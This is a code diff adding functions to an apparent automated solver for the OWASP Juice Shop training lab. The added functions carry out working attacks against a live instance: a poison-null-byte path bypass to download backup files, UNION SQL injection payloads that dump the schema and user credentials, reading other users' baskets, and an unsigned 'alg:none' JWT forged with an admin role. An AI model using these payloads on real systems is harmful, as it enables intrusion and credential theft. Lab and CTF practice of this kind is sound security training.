@@ -550,6 +550,62 @@ def _expired_coupon(c):
     c.post("/rest/basket/%s/checkout" % bid, json={"couponData": coupon}, headers=H)
 
 
+def _ftp_harvest(c):
+    """Browsable /ftp; the poison-null-byte (%2500) bypasses the md/pdf extension filter so the
+    other backup/config files download. Solves Confidential Document, Easter Egg, both Forgotten
+    Backups, Misplaced Signature File, and Poison Null Byte in one sweep."""
+    for p in ("/ftp/acquisitions.md", "/ftp/eastere.gg%2500.md", "/ftp/package.json.bak%2500.md",
+              "/ftp/coupons_2013.md.bak%2500.md", "/ftp/suspicious_errors.yml%2500.md"):
+        try:
+            c.get(p)
+        except Exception:
+            pass
+
+
+def _sqli_union_extract(c):
+    """UNION-based extraction on the product search. sqlite_master dumps the schema (Database Schema);
+    the Users table dumps credentials (User Credentials)."""
+    import urllib.parse
+    for sql in ("qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
+                "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"):
+        try:
+            c.get("/rest/products/search?q=" + urllib.parse.quote(sql))
+        except Exception:
+            pass
+
+
+def _view_basket(c):
+    """Register+login a fresh user, then read a basket that isn't theirs (missing object-level authz)."""
+    import time as _t
+    email = "vb_%d@x.io" % int(_t.time() * 1000 % 1e9)
+    _register(c, email, "aaaaaa")
+    lg = _login(c, email, "aaaaaa")
+    tok, bid = lg.get("token"), lg.get("bid")
+    if not tok:
+        return
+    H = {"Authorization": "Bearer %s" % tok}
+    for other in (1, 2, (bid - 1 if bid and bid > 1 else 2)):
+        if other != bid:
+            try:
+                c.get("/rest/basket/%d" % other, headers=H)
+            except Exception:
+                pass
+
+
+def _unsigned_jwt(c):
+    """Forge a JWT with alg:none (unsigned) and send it — the server accepts the 'none' algorithm."""
+    import base64
+    import json as _j
+    b64u = lambda o: base64.urlsafe_b64encode(_j.dumps(o).encode()).rstrip(b"=").decode()
+    forged = "%s.%s." % (b64u({"alg": "none", "typ": "JWT"}),
+                         b64u({"data": {"email": "jwtn3d@juice-sh.op", "role": "admin"}, "iat": 1600000000}))
+    for p in ("/rest/user/whoami", "/api/Challenges"):
+        try:
+            c.get(p, headers={"Authorization": "Bearer %s" % forged})
+        except Exception:
+            pass
+
+
 def solve(base_url: str) -> dict:
     """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
     try:
@@ -572,7 +628,8 @@ def solve(base_url: str) -> dict:
                      _forged_coupon, _two_factor, _feedback_patterns, _csrf, _change_bender,
                      _multiple_likes, _reflected_and_nosql, _api_and_header_xss, _serverside_xss,
                      _allowlist_bypass, _privacy_and_jwt, _imaginary,
-                     _product_tampering, _password_hash_leak, _expired_coupon):
+                     _product_tampering, _password_hash_leak, _expired_coupon,
+                     _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt):
             try:
                 step(c)
             except Exception:
